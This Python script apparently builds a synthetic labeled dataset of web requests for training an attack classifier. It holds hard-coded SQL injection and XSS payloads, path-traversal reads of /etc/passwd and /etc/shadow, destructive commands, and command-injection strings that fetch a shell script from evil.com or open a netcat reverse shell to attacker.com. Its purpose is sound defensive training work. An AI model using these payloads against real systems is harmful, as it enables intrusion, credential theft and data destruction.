# ml/training/generate_attack_dataset.py

import json
import random
import os

def generate_labeled_samples():
    """Generate synthetic labeled attack samples"""
    
    samples = []
    
    # === SQL Injection (SQLi) - 2000 samples ===
    sqli_payloads = [
        "' OR '1'='1", "1' UNION SELECT NULL--", "admin'--", "1' AND '1'='1",
        "; DROP TABLE users--", "1' ORDER BY 10--", "' OR 1=1#",
        "1' WAITFOR DELAY '00:00:05'--", "' OR 'a'='a", "') OR ('1'='1",
        "admin' /*", "' having 1=1--", "1' AND SLEEP(5)#",
        "ORDER BY 1,2,3,4,5--", "UNION SELECT table_name, null FROM information_schema.tables--",
        "1' AND 1=1; --", "' OR 1=1; DROP TABLE logs; --"
    ]
    
    for _ in range(2000):
        payload = random.choice(sqli_payloads)
        # Randomize slightly
        if random.random() > 0.5: payload = payload.replace(" ", "%20")
        if random.random() > 0.8: payload = payload.replace("'", "%27")
        
        ctx = {
            "method": "POST" if random.random() > 0.3 else "GET",
            "path": random.choice(["/api/search", "/login", "/products", "/api/query"]),
            "query_params": {"q": payload},
            "body_text": "" if random.random() > 0.5 else f"search={payload}",
            "label": "SQLi"
        }
        samples.append(ctx)
    
    # === XSS (Cross-Site Scripting) - 2000 samples ===
    xss_payloads = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)",
        "<svg onload=alert(1)>", "<iframe src=javascript:alert(1)>", "'-alert(1)-'",
        "\"><script>alert(1)</script>", "<body onload=alert('XSS')>",
        "<a href=\"javascript:alert(1)\">Click me</a>",
        "<input onfocus=alert(1) autofocus>",
        "<math href=\"javascript:alert(1)\">",
        "<script>eval(atob('YWxlcnQoMSk='))</script>" # alert(1) encoded
    ]
    
    for _ in range(2000):
        payload = random.choice(xss_payloads)
        ctx = {
            "method": "POST",
            "path": random.choice(["/api/comment", "/feedback", "/profile", "/search"]),
            "query_params": {} if random.random() > 0.7 else {"q": payload},
            "body_text": json.dumps({"comment": payload}),
            "label": "XSS"
        }
        samples.append(ctx)
    
    # === RCE (Remote Code Execution) - 1000 samples ===
    rce_payloads = [
        "; ls -la", "| whoami", "`cat /etc/passwd`", "$(id)",
        "$(wget http://evil.com/shell.sh)", "; nc -e /bin/sh attacker.com 4444",
        "& ping -c 10 127.0.0.1", "; netcat -l -p 8080",
        "|| printenv", "`touch /tmp/pwned`"
    ]
    
    for _ in range(1000):
        payload = random.choice(rce_payloads)
        ctx = {
            "method": "POST",
            "path": "/api/exec",
            "query_params": {},
            "body_text": f"cmd={payload}",
            "label": "RCE"
        }
        samples.append(ctx)
    
    # === Path Traversal (LFI) - 1000 samples ===
    lfi_payloads = [
        "../../etc/passwd", "....//....//etc/passwd", "..%2F..%2Fetc%2Fpasswd",
        "/proc/self/environ", "C:\\windows\\win.ini", "../../../var/log/apache2/access.log",
        "/etc/shadow", "file:///etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd" # Double URL encoded
    ]
    
    for _ in range(1000):
        payload = random.choice(lfi_payloads)
        ctx = {
            "method": "GET",
            "path": "/api/file",
            "query_params": {"path": payload},
            "body_text": "",
            "label": "PathTraversal"
        }
        samples.append(ctx)
        
    # === Command Injection (CMD) - 500 samples === 
    # (Often overlaps with RCE, but distinct usually by OS command context vs Code Exec)
    cmd_payloads = [
        "; cat /etc/passwd", "&& dir", "| ipconfig",
        "; shutdown -h now", "`reboot`"
    ]
    for _ in range(500):
        payload = random.choice(cmd_payloads)
        ctx = {
            "method": "POST",
            "path": "/admin/system/diagnostics",
            "body_text": f"tool=ping&host=1.1.1.1{payload}",
            "label": "CommandInjection"
        }
        samples.append(ctx)

    # === Benign samples (Legitimate traffic) - 8000 samples ===
    # We want more benign than attacks to be realistic, but balanced enough for training
    benign_paths = ["/", "/about", "/contact", "/api/users", "/api/products", "/static/css/main.css", "/images/logo.png"]
    benign_params = ["page=1", "id=123", "q=shoes", "sort=price_asc", "category=books"]
    
    for _ in range(8000):
        ctx = {
            "method": random.choice(["GET", "POST", "HEAD"]),
            "path": random.choice(benign_paths),
            "query_params": {"param": random.choice(benign_params)},
            "body_text": json.dumps({"foo": "bar", "user_id": 123}),
            "label": "Benign"
        }
        samples.append(ctx)
    
    # Shuffle
    random.shuffle(samples)
    
    # Ensure directory exists
    os.makedirs("ml/datasets", exist_ok=True)
    
    # Write to JSONL
    output_path = "ml/datasets/labeled_attacks.jsonl"
    with open(output_path, "w") as f:
        for sample in samples:
            f.write(json.dumps(sample) + "\n")
    
    print(f"Generated {len(samples)} labeled samples at {output_path}")

if __name__ == "__main__":
    generate_labeled_samples()
